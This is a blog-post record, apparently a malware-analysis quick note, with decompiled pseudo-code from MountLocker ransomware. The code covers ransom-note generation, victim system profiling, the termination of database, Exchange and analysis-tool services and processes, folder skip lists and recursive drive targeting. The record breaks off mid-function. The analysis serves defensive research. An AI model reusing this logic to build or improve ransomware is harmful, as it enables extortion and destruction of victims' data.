{
    "id": "e676eed2-7abc-4cfc-adee-3c554edb2171",
    "created_at": "2023-01-12T15:00:41.495786Z",
    "updated_at": "2025-03-27T02:05:49.699399Z",
    "deleted_at": null,
    "sha1_hash": "65389de5f68f01a9f4f4b620665d162234e345d1",
    "title": "2021-08-04 - [QuickNote] MountLocker – Some pseudo-code snippets",
    "authors": "",
    "file_creation_date": "2022-05-28T15:23:41Z",
    "file_modification_date": "2022-05-28T15:23:41Z",
    "file_size": 196846,
    "plain_text": "# [QuickNote] MountLocker – Some pseudo-code snippets\n\n**[kienmanowar.wordpress.com/2021/08/04/quicknote-mountlocker-some-pseudo-code-snippets/](https://kienmanowar.wordpress.com/2021/08/04/quicknote-mountlocker-some-pseudo-code-snippets/)**\n\nAugust 4, 2021\n\n## Refs:\n\n https://threatpost.com/mount-locker-ransomware-changes-tactics/165559/ https://chuongdong.com/reverse%20engineering/2021/05/23/MountLockerRansomwar e/ https://github.com/Finch4/Malware-Analysis-Reports/tree/master/MountLocker\n\n Parse RecoveryManual.html content in memory and fill %CLIENT_ID% :\n\n\n-----\n\n```\n // Generate CLIENT_ID\n for ( client_id_pos = StrStrIA(psz_recovery_manual_ransom_note, \"%CLIENT_ID%\");\n    client_id_pos;\n    client_id_pos = StrStrIA(psz_recovery_manual_ransom_note, \"%CLIENT_ID%\") )\n {\n  cnt = 32i64;\n  client_id_str = g_str_879538e20b82e80052dd5f7ef9ad5077;\n  // replace %CLIENT_ID% with generated client_id\n  // first 32 bytes is \"879538e20b82e80052dd5f7ef9ad5077\"\n  // and the rest 32 bytes is random value\n  do\n  {\n   client_id_str[client_id_pos - g_str_879538e20b82e80052dd5f7ef9ad5077] =\n*client_id_str;\n   ++client_id_str;\n   --cnt;\n  }\n  while ( cnt );\n  ptr_curr_pos = client_id_pos + 32;\n  for ( j = 0i64; j < 16; ++j )\n  {\n   *ptr_curr_pos = str_0123456789abcdef[(unsigned __int64)(unsigned\n__int8)szComputerName[j] >> 4];\n   ptr_next_pos = ptr_curr_pos + 1;\n   ch_ = szComputerName[j];\n   *ptr_next_pos = str_0123456789abcdef[ch_ & 0xF];\n   ptr_curr_pos = ptr_next_pos + 1;\n  }\n }\n\n## Create registry key for opening RecoveryManual.html :\n // Software\\Classes\\.F638D8A0\\shell\\Open\\command\n wsprintfW(pwzSubKey, L\"Software\\\\Classes\\\\.%0.8X\\\\shell\\\\Open\\\\command\",\ng_0xF638D8A0);\n cbData = lstrlenW(L\"explorer.exe RecoveryManual.html\");\n // Sets a registry subkey value in a user-specific subtree (HKEY_CURRENT_USER or\nHKEY_LOCAL_MACHINE).\n SHRegSetUSValueW(pwzSubKey, &pwzValue, 1u, L\"explorer.exe RecoveryManual.html\", 2 *\ncbData, SHREGSET_FORCE_HKCU);\n\n Create log file if /NOLOG is not set:\n\n```\n\n-----\n\n```\n if ( !g_nolog_flag )\n {\n  lstrcpyW(lpLogFile, lpMountLockerPath);\n  lstrcatW(lpLogFile, L\".log\");\n  // dwShareMode = FILE_SHARE_READ | FILE_SHARE_WRITE\n  h_log_file = CreateFileW(lpLogFile, GENERIC_WRITE|GENERIC_READ, 3u, 0i64,\nCREATE_ALWAYS, 0, 0i64);\n  if ( h_log_file == (HANDLE)INVALID_HANDLE_VALUE )\n  {\n   h_log_file = 0i64;\n  }\n  else\n  {\n   g_log_file_and_console_flag = 1;\n  }\n }\n // if set /CONSOLE, also log through console.\n if ( g_console_flag && AllocConsole() )\n {\n  hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);\n  if ( hConsoleOutput == (HANDLE)INVALID_HANDLE_VALUE )\n  {\n   hConsoleOutput = 0i64;\n  }\n  else\n  {\n   g_log_file_and_console_flag = 1;\n  }\n }\n\n## Collect victim’s system info:\n\n```\n\n-----\n\n```\nint __stdcall f_ml_collect_and_log_victim_info()\n{\n __int64 win_arch_value; // r8\n _BOOL join_domain_status; // eax\n const wchar_t *szYesNo; // rbx MAPDST\n LPWSTR lpCmdLine; // rax\n SYSTEM_PROCESSOR_INFORMATION NativeSystemInformation; // [rsp+30h] [rbp-D0h]\n struct _SYSTEM_INFO SystemInfo; // [rsp+40h] [rbp-C0h]\n struct _MEMORYSTATUS Buffer; // [rsp+70h] [rbp-90h]\n struct _OSVERSIONINFOW VersionInformation; // [rsp+B0h] [rbp-50h]\n unsigned __int16 v10; // [rsp+1C4h] [rbp+C4h]\n WCHAR wsz_infoBuf[272]; // [rsp+1D0h] [rbp+D0h]\n DWORD bufCharCount; // [rsp+400h] [rbp+300h]\n enum _NETSETUP_JOIN_STATUS JoinStatus; // [rsp+408h] [rbp+308h]\n LPWSTR NameBuffer; // [rsp+410h] [rbp+310h]\n f_ml_write_format_string_to_log_file_or_console(3, L\"========== SYS INFO\n==========\\r\\n\");\n GetSystemInfo(&SystemInfo);\n f_ml_write_format_string_to_log_file_or_console(3, L\"CORE COUNT:\\t%u\\r\\n\",\nSystemInfo.dwNumberOfProcessors);\n GlobalMemoryStatus(&Buffer);\n f_ml_write_format_string_to_log_file_or_console(3, L\"TOTAL MEM:\\t%u MB\\r\\n\",\nBuffer.dwTotalPhys >> 0x14);\n memset(&VersionInformation, 0, 0x11Cu);\n VersionInformation.dwOSVersionInfoSize = 0x11C;\n if ( !RtlGetVersion(&VersionInformation) )\n {\n  f_ml_write_format_string_to_log_file_or_console(\n   3,\n   L\"WIN VER:\\t%u.%u.%u SP%u\\r\\n\",\n   VersionInformation.dwMajorVersion,\n   VersionInformation.dwMinorVersion,\n   VersionInformation.dwBuildNumber,\n   v10);\n }\n if ( !(unsigned int)RtlGetNativeSystemInformation(1i64, &NativeSystemInformation,\n0xCi64) )\n {\n  win_arch_value = CPU_ARCH_x86;\n  if ( NativeSystemInformation.ProcessorArchitecture ==\nPROCESSOR_ARCHITECTURE_AMD64 )\n  {\n   win_arch_value = CPU_ARCH_x64;\n  }\n  f_ml_write_format_string_to_log_file_or_console(3, L\"WIN ARCH:\\tx%u\\r\\n\",\nwin_arch_value);\n }\n bufCharCount = 0xFA;\n if ( GetUserNameW(wsz_infoBuf, &bufCharCount) )\n {\n  wsz_infoBuf[bufCharCount] = 0;\n  f_ml_write_format_string_to_log_file_or_console(3, L\"USER NAME:\\t%s\\r\\n\",\nwsz_infoBuf);\n }\n\n```\n\n-----\n\n```\n bufCharCount 0xFA;\n if ( GetComputerNameW(wsz_infoBuf, &bufCharCount) )\n {\n  wsz_infoBuf[bufCharCount] = 0;\n  f_ml_write_format_string_to_log_file_or_console(3, L\"PC NAME:\\t%s\\r\\n\",\nwsz_infoBuf);\n }\n JoinStatus = NetSetupUnknownStatus;\n NameBuffer = 0i64;\n if ( NetGetJoinInformation(0i64, &NameBuffer, &JoinStatus) )\n {\n  join_domain_status = 0;           // NetSetupUnknownStatus \n }\n else\n {\n  NetApiBufferFree(NameBuffer);\n  *(_QWORD *)&join_domain_status = JoinStatus == NetSetupDomainName;// The computer\nis joined to a domain. \n }\n szYesNo = L\"NO\";\n szYesNo = L\"NO\";\n if ( join_domain_status )\n {\n  szYesNo = L\"YES\";              // computer is joined domain\n }\n f_ml_write_format_string_to_log_file_or_console(3, L\"IN DOMAIN:\\t%s\\r\\n\", szYesNo);\n if ( g_isAdmin )\n {\n  szYesNo = L\"YES\";\n }\n f_ml_write_format_string_to_log_file_or_console(3, L\"IS ADMIN:\\t%s\\r\\n\", szYesNo);\n f_ml_log_group_infos();\n // get cmd_line info when malware is exectuted\n lpCmdLine = GetCommandLineW();\n return f_ml_write_format_string_to_log_file_or_console(3, L\"CMDLINE:\\t%s\\r\\n\",\nlpCmdLine);\n}\n\n## Result:\n\n```\n\n-----\n\n```\n      SYS INFO\nCORE COUNT: 4\nTOTAL MEM: 4095 MB\nWIN VER: 6.1.7601 SP1\nWIN ARCH: x64\nUSER NAME: xxxxx\nPC NAME: xxxxx-PC\nIN DOMAIN: NO\nIS ADMIN: YES\nIN GROUPS:\n     Mandatory xxxxx-PC\\None\n     Mandatory \\Everyone\n     Mandatory NT AUTHORITY\\Local account and member of Administrators group\n     Mandatory BUILTIN\\Administrators\n     Mandatory BUILTIN\\Users\n     Mandatory NT AUTHORITY\\INTERACTIVE\n     Mandatory \\CONSOLE LOGON\n     Mandatory NT AUTHORITY\\Authenticated Users\n     Mandatory NT AUTHORITY\\This Organization\n     Mandatory NT AUTHORITY\\Local account\n     Mandatory \\LOCAL\n     Mandatory NT AUTHORITY\\NTLM Authentication\n     Integrity Mandatory Label\\High Mandatory Level\nCMDLINE: \"mount_locker.exe\"\n\n## If /NOKILL is 0, it enumerates and kills all services and processes:\n\n + Kill services, if service name contains any string is \"SQL\", \"database\", \"msexchange\" :\n\n```\n\n-----\n\n```\nint f_ml_kill_services_and_log_info()\n{\n SC_HANDLE schSCManager; // rdi\n HANDLE h_proc_heap; // rax MAPDST\n struct _ENUM_SERVICE_STATUSA *lpServices; // rax MAPDST\n int ret; // esi\n __int64 svc_cnt; // rbx\n int result; // eax\n DWORD win32_err_code; // eax\n WCHAR *err_str; // r8\n WCHAR v10[36]; // [rsp+40h] [rbp-48h]\n DWORD NumServicesReturned; // [rsp+90h] [rbp+8h]\n DWORD ResumeHandle; // [rsp+98h] [rbp+10h]\n DWORD pcbBytesNeeded; // [rsp+A0h] [rbp+18h]\n f_ml_write_format_string_to_log_file_or_console(3,\nL\"\\r\\n================================\\r\\n\");\n f_ml_write_format_string_to_log_file_or_console(3, L\"     KILL SERVICE    \n\\r\\n\");\n f_ml_write_format_string_to_log_file_or_console(3,\nL\"================================\\r\\n\");\n ResumeHandle = 0;\n schSCManager = OpenSCManagerA(0i64, 0i64, SC_MANAGER_ALL_ACCESS);\n if ( !schSCManager )\n {\n  goto log_error;\n }\n h_proc_heap = GetProcessHeap();\n lpServices = (struct _ENUM_SERVICE_STATUSA *)HeapAlloc(h_proc_heap,\nHEAP_ZERO_MEMORY, 0x40001ui64);\n if ( !lpServices )\n {\n  CloseServiceHandle(schSCManager);\nlog_error:\n  win32_err_code = GetLastError();\n  if ( (win32_err_code & 0xFFFF0000) == 0x80070000 )\n  {\n   win32_err_code = (unsigned __int16)win32_err_code;\n  }\n  switch ( win32_err_code )\n  {\n   case ERROR_LOGON_FAILURE:\n    err_str = L\"LOGON_ERROR\";\n    break;\n   case 5u:\n    err_str = L\"ACCESS_DENIED\";\n    break;\n   case 8u:\n    err_str = L\"NOT_ENOUGH_MEMORY\";\n    break;\n   case 0x35u:\n    err_str = L\"BAD_PATH_OR_OFFLINE\";\n    break;\n   default:\n    wsprintfW(v10, L\"%0.8X\", win32_err_code);\n\n```\n\n-----\n\n```\n    err_str v10;\n    break;\n  }\n  return f_ml_write_format_string_to_log_file_or_console(3, L\"[ERROR]\nlocekr.kill.service > get services list error=%s\\r\\n\", err_str);\n }\n // dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_WIN32_SHARE_PROCESS |\nSERVICE_WIN32\n // dwServiceState = SERVICE_ACTIVE\n ret = EnumServicesStatusA(schSCManager, SERVICE_WIN32, 1u, lpServices, 0x40000u,\n&pcbBytesNeeded, &NumServicesReturned, &ResumeHandle);\n if ( ret )\n {\n  svc_cnt = 0i64;\n  if ( NumServicesReturned )\n  {\n   // kills all services with these strings in their name: \"SQL\", \"database\",\n\"msexchange\"\n   while ( 1 )\n   {\n    ret = f_ml_terminate_service_and_log_info(schSCManager, (PCSTR\n*)&lpServices[svc_cnt].lpServiceName);\n    if ( !ret )\n    {\n     break;\n    }\n    svc_cnt = (unsigned int)(svc_cnt + 1);\n    if ( (unsigned int)svc_cnt >= NumServicesReturned )\n    {\n     goto exit_sub;\n    }\n   }\n   ret = 1;\n  }\n }\nexit_sub:\n h_proc_heap = GetProcessHeap();\n HeapFree(h_proc_heap, 0, lpServices);\n result = CloseServiceHandle(schSCManager);\n if ( !ret )\n {\n  goto log_error;\n }\n return result;\n}\n\n```\n\n-----\n\n```\n__int64 __fastcall f_ml_terminate_service_and_log_info(SC_HANDLE schSCManager, PCSTR\n*lpServiceName)\n{\n DWORD v4; // er8\n int ret; // eax\n const wchar_t *kill_service_status; // rdx\n if ( !StrStrIA(*lpServiceName, \"SQL\")\n  && !StrStrIA(*lpServiceName, \"database\")\n  && !StrStrIA(*lpServiceName, \"msexchange\")\n  && !StrStrIA(lpServiceName[1], \"SQL\")\n  && !StrStrIA(lpServiceName[1], \"database\")\n  && !StrStrIA(lpServiceName[1], \"msexchange\") )\n {\n  return 1i64;\n }\n // Terminate service if contains any of the three strings above.\n f_ml_write_format_string_to_log_file_or_console(3, L\"%S... \", *lpServiceName);\n ret = f_ml_terminate_service(schSCManager, *lpServiceName, v4);\n if ( ret >= 0 )\n {\n  kill_service_status = L\"timeout\\r\\n\";\n  if ( ret )\n  {\n   kill_service_status = L\"ok\\r\\n\";\n  }\n }\n else\n {\n  kill_service_status = L\"fail\\r\\n\";\n }\n f_ml_write_format_string_to_log_file_or_console(3, kill_service_status);\n return 1i64;\n}\n\n## + Kill processes, if process name is matching with hard-coded list:\n\n```\n\n-----\n\n```\n msftesql.exe \n\"sqlagent.exe\"\n\"sqlbrowser.exe\"\n\"sqlwriter.exe\"\n\"oracle.exe\"\n\"ocssd.exe\"\n\"dbsnmp.exe\"\n\"synctime.exe\"\n\"agntsvc.exe\"\n\"isqlplussvc.exe\"\n\"xfssvccon.exe\"\n\"sqlservr.exe\"\n\"mydesktopservice.exe\"\n\"ocautoupds.exe\"\n\"encsvc.exe\"\n\"firefoxconfig.exe\"\n\"tbirdconfig.exe\"\n\"mydesktopqos.exe\"\n\"ocomm.exe\"\n\"mysqld.exe\"\n\"mysqld-nt.exe\"\n\"mysqld-opt.exe\"\n\"dbeng50.exe\"\n\"sqbcoreservice.exe\"\n\"excel.exe\"\n\"infopath.exe\"\n\"msaccess.exe\"\n\"mspub.exe\"\n\"onenote.exe\"\n\"outlook.exe\"\n\"powerpnt.exe\"\n\"sqlservr.exe\"\n\"thebat.exe\"\n\"steam.exe\"\n\"thebat64.exe\"\n\"thunderbird.exe\"\n\"visio.exe\"\n\"winword.exe\"\n\"wordpad.exe\"\n\"QBW32.exe\"\n\"QBW64.exe\"\n\"ipython.exe\"\n\"wpython.exe\"\n\"python.exe\"\n\"dumpcap.exe\"\n\"procmon.exe\"\n\"procmon64.exe\"\n\"procexp.exe\"\n\"procexp64.exe\"\n\n```\n\n-----\n\n```\nint __stdcall f_ml_kill_processes_and_log_info()\n{\n DWORD curr_proc_id; // esi\n SYSTEM_PROCESS_INFORMATION *SystemInformation; // rdx\n SIZE_T dwBytes; // rbx\n HANDLE h_proc_heap; // rax MAPDST\n SYSTEM_PROCESS_INFORMATION *system_proc_info; // rax MAPDST\n unsigned int status; // eax\n int nChar; // eax\n DWORD win32_err_code; // eax\n WCHAR *err_str; // r8\n WCHAR v14[24]; // [rsp+40h] [rbp-C0h]\n CHAR process_name[272]; // [rsp+70h] [rbp-90h]\n ULONG SystemInformationLength; // [rsp+1A0h] [rbp+A0h]\n f_ml_write_format_string_to_log_file_or_console(3,\nL\"\\r\\n================================\\r\\n\");\n f_ml_write_format_string_to_log_file_or_console(3, L\"     KILL PROCESS    \n\\r\\n\");\n f_ml_write_format_string_to_log_file_or_console(3,\nL\"================================\\r\\n\");\n system_proc_info = 0i64;\n SystemInformationLength = 0;\n *(_QWORD *)&curr_proc_id = GetCurrentProcessId();\n for ( SystemInformation = 0i64; ; SystemInformation = system_proc_info )\n {\n  status = ZwQuerySystemInformation(SystemProcessInformation, SystemInformation,\nSystemInformationLength, &SystemInformationLength);\n  if ( status != (unsigned int)STATUS_INFO_LENGTH_MISMATCH )// record length does\nnot match the length required for the specified information class.\n  {\n   break;\n  }\n  if ( !SystemInformationLength )\n  {\n   goto log_error_info;\n  }\n  dwBytes = SystemInformationLength + 1i64;\n  h_proc_heap = GetProcessHeap();\n  system_proc_info = (SYSTEM_PROCESS_INFORMATION *)(system_proc_info ?\nHeapReAlloc(h_proc_heap, HEAP_ZERO_MEMORY, system_proc_info, dwBytes) :\nHeapAlloc(h_proc_heap, HEAP_ZERO_MEMORY, dwBytes));\n  if ( !system_proc_info )\n  {\n   goto log_error_info;\n  }\n }\n if ( status )\n {\n  SetLastError(status);\n  if ( system_proc_info )\n  {\n   h_proc_heap = GetProcessHeap();\n   HeapFree(h_proc_heap, 0, system_proc_info);\n  }\n\n```\n\n-----\n\n```\n }\n else if ( system_proc_info )\n {\n  while ( 1 )\n  {\n   if ( (unsigned __int64)system_proc_info->UniqueProcessId &\n0xFFFFFFFFFFFFFFFBui64\n    && system_proc_info->NumberOfThreads\n    && system_proc_info->UniqueProcessId != *(HANDLE *)&curr_proc_id// avoid\ncurrent MountLocker process\n    && system_proc_info->ImageName.Buffer\n    && system_proc_info->ImageName.Length )\n   {\n    process_name[0] = 0;\n    // CodePage = CP_ACP\n    nChar = WideCharToMultiByte(\n         0,\n         0,\n         system_proc_info->ImageName.Buffer,\n         system_proc_info->ImageName.Length >> 1,\n         process_name,\n         MAX_PATH,\n         0i64,\n         0i64);\n    if ( nChar < 0 )\n    {\n     process_name[0] = 0;\n    }\n    else\n    {\n     process_name[nChar] = 0;\n    }\n    // enumerate and kill all processes if process name is matching with\nhardcoded list\n    if ( !f_ml_terminate_process(process_name, system_proc_info) )\n    {\n     break;\n    }\n   }\n   if ( !system_proc_info->NextEntryOffset )\n   {\n    break;\n   }\n   system_proc_info = (SYSTEM_PROCESS_INFORMATION *)((char *)system_proc_info +\nsystem_proc_info->NextEntryOffset);\n  }\n  h_proc_heap = GetProcessHeap();\n  return HeapFree(h_proc_heap, 0, system_proc_info);\n }\nlog_error_info:\n win32_err_code = GetLastError();\n if ( (win32_err_code & 0xFFFF0000) == 0x80070000 )\n {\n  win32_err_code = (unsigned __int16)win32_err_code;\n }\n\n```\n\n-----\n\n```\n switch ( win32_err_code )\n {\n  case 0x52Eu:\n   err_str = L\"LOGON_ERROR\";\n   break;\n  case 5u:\n   err_str = L\"ACCESS_DENIED\";\n   break;\n  case 8u:\n   err_str = L\"NOT_ENOUGH_MEMORY\";\n   break;\n  case 0x35u:\n   err_str = L\"BAD_PATH_OR_OFFLINE\";\n   break;\n  default:\n   wsprintfW(v14, L\"%0.8X\", win32_err_code);\n   err_str = v14;\n   break;\n }\n return f_ml_write_format_string_to_log_file_or_console(3, L\"[ERROR]\nlocekr.kill.process > get process list error=%s\\r\\n\", err_str);\n}\n\n```\n\n-----\n\n```\nunsigned int __fastcall f_ml_terminate_process(LPCSTR process_name,\nSYSTEM_PROCESS_INFORMATION *system_proc_info)\n{\n const CHAR *ptr_proc_list; // rax\n int i; // ebx\n HANDLE h_process; // rax MAPDST\n BOOL status; // ebx\n const wchar_t *str; // rdx\n ptr_proc_list = g_processes_list;\n i = 0;\n while ( ptr_proc_list )\n {\n  if ( !lstrcmpiA(process_name, ptr_proc_list) )\n  {\n   f_ml_write_format_string_to_log_file_or_console(3, L\"%S... \", process_name);\n   h_process = OpenProcess(1u, 0, (DWORD)system_proc_info->UniqueProcessId);\n   if ( h_process )\n   {\n    status = TerminateProcess(h_process, 0);\n    CloseHandle(h_process);\n    str = L\"ok\\r\\n\";\n    if ( !status )\n    {\n     str = L\"fail kill\\r\\n\";\n    }\n   }\n   else\n   {\n    str = L\"fail open\\r\\n\";\n   }\n   f_ml_write_format_string_to_log_file_or_console(3, str);\n   return 1;\n  }\n  ptr_proc_list = (&g_processes_list)[++i];\n }\n return 1;\n}\n\n## Enumerate target drive:\n\n```\n\n-----\n\n```\nml_target_detail __fastcall f_ml_enum_target_drive(LPCWSTR target_name, __int64 a2,\n__int64 a3, ml_target_info *target_info)\n{\n HANDLE h_proc_heap; // rax MAPDST\n ml_target_detail *target_detail; // rax MAPDST\n __int64 target_name_len; // rcx\n unsigned int v10; // ebx\n h_proc_heap = GetProcessHeap();\n target_detail = (ml_target_detail *)HeapAlloc(h_proc_heap, 8u, 0x20271ui64);\n if ( !target_detail )\n {\n  return target_detail;\n }\n *(_QWORD *)&target_detail->num_targets = 0i64;\n target_detail->val_1 = 1;\n target_detail->target_info = target_info;\n target_detail->f_ml_processing_target_and_drop_ransom_note =\nf_ml_processing_target_and_drop_ransom_note;\n lstrcpyW(target_detail->target_name, target_name);\n target_name_len = lstrlenW(target_name);\n if ( *((_WORD *)&target_detail->field_1C + target_name_len + 1) != '\\\\' )\n {\n  *(_DWORD *)&target_detail->target_name[target_name_len] = '\\\\';\n }\n v10 = f_ml_recursive_enum_folder(target_detail);\n h_proc_heap = GetProcessHeap();\n HeapFree(h_proc_heap, 0, target_detail);\n target_detail = (ml_target_detail *)v10;\n return target_detail;\n}\n\n## + Skip if folder name is \".\" or \"..\" :\n\n```\n\n-----\n\n```\n  if ( target_detail_cp >lpFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )\n  {\n   if ( target_detail_cp->lpFindData.cFileName[0] != '.'\n    || (v11 = target_detail_cp->lpFindData.cFileName[1]) != 0 && (v11 != '.' ||\ntarget_detail_cp->lpFindData.cFileName[2]) )// check '.' and '..'\n   {\n    // ex: \\\\?\\c:\\$Recycle.Bin\n    lstrcpyW(v7->target_name, target_detail_cp->lpFindData.cFileName);\n    // \\\\?\\c:\\$Recycle.Bin\\\n    lstrcatW(v7->target_name, L\"\\\\\");\n    if ( target_detail_cp->f_ml_processing_target_and_drop_ransom_note(IS_FOLDER,\nstru_offset, target_detail_cp->target_info) )\n    {\n     if ( target_detail_cp->val_1 )\n     {\n      ++target_detail_cp->field_1C;\n      f_ml_recursive_enum_folder(target_detail_cp);\n      --target_detail_cp->field_1C;\n     }\n    }\n    v7->target_name[0] = 0;         // clear file or folder name\n   }\n  }\n\n## + Call function for checking target (folder / file) can be encrypted:\n__int64 __fastcall f_ml_processing_target_and_drop_ransom_note(int isFolder, __int64\n*stru_offset, ml_target_info *target_info)\n{\n // if target is folder, check is in avoid list\n if ( isFolder )\n {\n  return f_ml_check_folder_in_ignored_list_and_log_info(stru_offset, target_info);\n }\n // else if target is file, check is valid\n if ( f_ml_check_file_is_in_exception_list(stru_offset, target_info) )\n {\n  f_ml_push_target_in_queue(stru_offset, target_info);\n }\n if ( target_info->field_0 == *(_DWORD *)stru_offset )\n {\n  return 1i64;\n }\n // drop a ransom note in the folder.\n lstrcpyW(&target_info->target_ransom_note_name, CONTAINING_RECORD(stru_offset,\nml_target_detail, num_targets)->target_name);\n lstrcatW(&target_info->target_ransom_note_name, L\"RecoveryManual.html\");\n if ( f_ml_create_file(&target_info->target_ransom_note_name,\npsz_recovery_manual_ransom_note, pcbRecoveryManualLen) )\n {\n  target_info->field_0 = *(_DWORD *)stru_offset;\n }\n return 1i64;\n}\n\n```\n\n-----\n\n## + If target is folder, skipped folder is in ignored list:\n```\n\":\\\\Windows\\\\\"\n\":\\\\System Volume Information\\\\\"\n\":\\\\$RECYCLE.BIN\\\\\"\n\":\\\\SYSTEM.SAV\"\n\":\\\\WINNT\"\n\":\\\\$WINDOWS.~BT\\\\\"\n\":\\\\Windows.old\\\\\"\n\":\\\\PerfLog\\\\\"\n\":\\\\Boot\"\n\":\\\\ProgramData\\\\Microsoft\\\\\"\n\":\\\\ProgramData\\\\Packages\\\\\"\n\"$\\\\Windows\\\\\"\n\"$\\\\System Volume Information\\\\\"\n\"$\\\\$RECYCLE.BIN\\\\\"\n\"$\\\\SYSTEM.SAV\"\n\"$\\\\WINNT\"\n\"$\\\\$WINDOWS.~BT\\\\\"\n\"$\\\\Windows.old\\\\\"\n\"$\\\\PerfLog\\\\\"\n\"$\\\\Boot\"\n\"$\\\\ProgramData\\\\Microsoft\\\\\"\n\"$\\\\ProgramData\\\\Packages\\\\\"\n\"\\\\WindowsApps\\\\\"\n\"\\\\Microsoft\\\\Windows\\\\\"\n\"\\\\Local\\\\Packages\\\\\"\n\"\\\\Windows Defender\"\n\"\\\\microsoft shared\\\\\"\n\"\\\\Google\\\\Chrome\\\\\"\n\"\\\\Mozilla Firefox\\\\\"\n\"\\\\Mozilla\\\\Firefox\\\\\"\n\"\\\\Internet Explorer\\\\\"\n\"\\\\MicrosoftEdge\\\\\"\n\"\\\\Tor Browser\\\\\"\n\"\\\\AppData\\\\Local\\\\Temp\\\\\"\n\n```\n\n-----\n\n```\n__int64 __fastcall f_ml_check_folder_in_ignored_list_and_log_info(__int64\n*stru_offset, ml_target_info *target_info)\n{\n REPARSE_DATA_BUFFER *reparse_point_data; // r14\n const WCHAR *ptr_ignored_folder_list; // rax\n const WCHAR *target_name; // rdi\n __int64 i; // rbx\n const wchar_t *black_list_info; // rdx\n HANDLE hFile; // rbp\n __int64 win32_err_code; // r8\n const wchar_t *err_log_str; // rdx\n BOOL ret; // ebx\n __int64 v14; // rax\n char *v15; // rbx\n DWORD BytesReturned; // [rsp+68h] [rbp+10h]\n reparse_point_data = (REPARSE_DATA_BUFFER *)&target_info->target_ransom_note_name;\n _InterlockedAdd(&dword_140013350, 1u);\n ptr_ignored_folder_list = g_ignored_folder_list;\n target_name = CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>target_name;\n i = 0i64;\n while ( ptr_ignored_folder_list )\n {\n  if ( StrStrIW(target_name, ptr_ignored_folder_list) )\n  {\n   black_list_info = L\"[SKIP] locker.dir.check > black_list name=%s\\r\\n\";\nLABEL_10:\n   _InterlockedAdd(&dword_140013354, 1u);\nlog_info:\n   f_ml_write_format_string_to_log_file_or_console(1, black_list_info,\ntarget_name);\n   return 0i64;\n  }\n  ptr_ignored_folder_list = (&g_ignored_folder_list)[++i];\n }\n if ( g_target || g_fullpd_flag )\n {\n  target_info->encrypt_target_of_full_flag = 0;\n }\n else if ( f_ml_check_folder_name_is_ProgramData_ProgramFiles_SQL(stru_offset,\ntarget_info) )\n {\n  black_list_info = L\"[SKIP] locker.dir.check > no sql program dir name=%s\\r\\n\";\n  goto LABEL_10;\n }\n if ( !(CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>lpFindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) )\n {\n  f_ml_write_format_string_to_log_file_or_console(1, L\"[OK] locker.dir.check >\nname=%s\\r\\n\", target_name);\n  return 1i64;\n }\n // try to open target\n // dwShareMode = FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE\n\n```\n\n-----\n\n```\n // dwCreationDisposition OPEN_EXISTING\n hFile = CreateFileW(target_name, 0x80u, 7u, 0i64, OPEN_EXISTING, 0x2200400u, 0i64);\n if ( hFile == (HANDLE)INVALID_HANDLE_VALUE )\n {\n  win32_err_code = GetLastError();\n  err_log_str = L\"[WARN] locker.dir.check > open error=%u name=%s\\r\\n\";\nlog_error:\n  f_ml_write_format_string_to_log_file_or_console(1, err_log_str, win32_err_code,\ntarget_name);\n  return 1i64;\n }\n // Use DeviceIoControl() with the FSCTL_GET_REPARSE_POINT control code to obtain an\nREPARSE_DATA_BUFFER struct\n ret = DeviceIoControl(hFile, FSCTL_GET_REPARSE_POINT, 0i64, 0, reparse_point_data,\n0x4000u, &BytesReturned, 0i64);\n CloseHandle(hFile);\n if ( !ret )\n {\n  win32_err_code = GetLastError();\n  err_log_str = L\"[WARN] locker.dir.check > get_reparse_point error=%u\nname=%s\\r\\n\";\n  goto log_error;\n }\n // folder is a mount point\n if ( reparse_point_data->ReparseTag == IO_REPARSE_TAG_MOUNT_POINT )\n {\n  v14 = 0x10i64;\n }\n else\n {\n  if ( reparse_point_data->ReparseTag != IO_REPARSE_TAG_SYMLINK )// folder is not a\nsymbolic link\n  {\n   win32_err_code = reparse_point_data->ReparseTag;\n   err_log_str = L\"[WARN] locker.dir.check > unknown_tag tag=%0.8X name=%s\\r\\n\";\n   goto log_error;\n  }\n  v14 = 0x14i64;\n }\n v15 = (char *)reparse_point_data + v14;\n if ( *target_name == '\\\\'\n  && CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)->target_name[1]\n== '\\\\'\n  && CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)->target_name[2]\n!= '?' )\n {\n  black_list_info = L\"[SKIP] locker.dir.check > reparse_point_into_share\nname=%s\\r\\n\";\n  goto log_info;\n }\n if ( StrStrIW((PCWSTR)((char *)reparse_point_data + v14), L\":\\\\\") )\n {\n  _InterlockedAdd(&dword_140013354, 1u);\n  f_ml_write_format_string_to_log_file_or_console(1, L\"[SKIP] locker.dir.check >\ntarget_visibled target=%s name=%s\\r\\n\", v15, target_name);\n\n```\n\n-----\n\n```\n  return 0i64;\n }\n f_ml_write_format_string_to_log_file_or_console(1, L\"[OK] locker.dir.check >\ntarget_hidden target=%s name=%s\\r\\n\", v15, target_name);\n return 1i64;\n}\n\n## …. and skipped folder name is:\n\"SQL\"\n\"Program Files\"\n\"Program Files (x86)\"\n\"ProgramData\"\n_BOOL __fastcall f_ml_check_folder_name_is_ProgramData_ProgramFiles_SQL(__int64\n*stru_offset, ml_target_info *target_info)\n{\n __int32 flag; // ebx\n const WCHAR *target_name; // rsi\n flag = 0;\n if ( CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)->field_1C )\n {\n  return target_info->encrypt_target_of_full_flag\n    && CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)->field_1C ==\n1\n    && !StrStrIW(CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>lpFindData.cFileName, L\"SQL\");\n }\n target_name = CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>lpFindData.cFileName;\n if ( StrCmpIW(CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>lpFindData.cFileName, L\"Program Files\")\n  && StrCmpIW(target_name, L\"Program Files (x86)\") )\n {\n  LOBYTE(flag) = StrCmpIW(target_name, L\"ProgramData\") == 0;\n  target_info->encrypt_target_of_full_flag = flag;\n }\n else\n 